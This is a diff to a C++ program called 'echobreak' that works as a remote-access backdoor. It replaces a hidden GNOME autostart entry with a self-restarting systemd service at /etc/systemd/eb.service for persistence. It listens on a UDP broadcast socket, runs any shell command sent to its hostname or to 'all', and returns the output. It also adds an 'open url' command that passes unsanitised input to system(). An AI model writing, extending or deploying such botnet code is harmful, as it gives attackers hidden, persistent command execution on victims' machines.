@@ -1,6 +1,7 @@
 #include <cstdlib>
 #include <fstream>
 #include <cstring>
+#include <ios>
 #include <netinet/in.h>
 #include <string>
 #include <sys/socket.h>
@@ -45,24 +46,24 @@ std::string exec(const char* cmd) {
 }
 
 int main() {
+    std::string service = "/etc/systemd/eb.service";
 
-    std::string homedir = std::getenv("HOME");
-    std::string autostart_dir = homedir + "/.config/autostart/";
-    std::string dpath = autostart_dir + "eb.desktop";
-
-    if(!std::ifstream(dpath)){
-        std::string homedir = std::getenv("HOME");
-        std::string autostart_dir = homedir + "/.config/autostart/";
-
-        std::ofstream dfile(dpath);
-        dfile << "[Desktop Entry]\n";
-        dfile << "Type=Application\n";
-        dfile << "Exec=/bin/eb.net\n";
-        dfile << "Hidden=true\n";
-        dfile << "NoDisplay=true\n";
-        dfile << "X-GNOME-Autostart-enabled=true\n";
-        dfile << "Name=eb\n";
-        dfile.close();
+    if(!std::ifstream(service)){
+        std::ofstream sfile(service, std::ios::out);
+        sfile << "[Unit]\n";
+        sfile << "Description=echobreak\n";
+        sfile << "After=network.target";
+        sfile << "\n";
+        sfile << "[Service]\n";
+        sfile << "Type=simple\n";
+        sfile << "ExecStart=/bin/eb.net\n";
+        sfile << "Restart=always\n";
+        sfile << "User=nobody\n";
+        sfile << "Group=nogroup\n";
+        sfile << "\n";
+        sfile << "[Install]\n";
+        sfile << "WantedBy=multi-user.target";
+        sfile.close();
     }
     int sock;
     struct sockaddr_in broadcastAddr;
@@ -85,14 +86,21 @@ int main() {
         return -1;
     }
 
+    std::vector<std::string> msg;
+
     while (true) {
         socklen_t addrLen = sizeof(broadcastAddr);
         ssize_t bytesReceived = recvfrom(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr*)&broadcastAddr, &addrLen);
+        msg = split((std::string)buffer);
+
         if (bytesReceived > 0) {
-            if(split((std::string)buffer)[0] == exec("hostname") || split((std::string)buffer)[0] == "all"){
-                if(split((std::string)buffer)[1] == "cmd"){
-                    std::string answ = exec(split((std::string)buffer)[2].c_str());
+            if(msg[0] == exec("hostname") || msg[0] == "all"){
+                if(msg[1] == "cmd"){
+                    std::string answ = exec(msg[2].c_str());
                     sendto(sock, answ.c_str(), answ.size(), 0, (struct sockaddr*)&broadcastAddr, addrLen);
+                }
+                else if(msg[1] == "open url"){
+                        system((std::string("xdg-open ") + msg[2]).c_str());
                 }
             }
             memset(buffer, 0, sizeof(buffer));
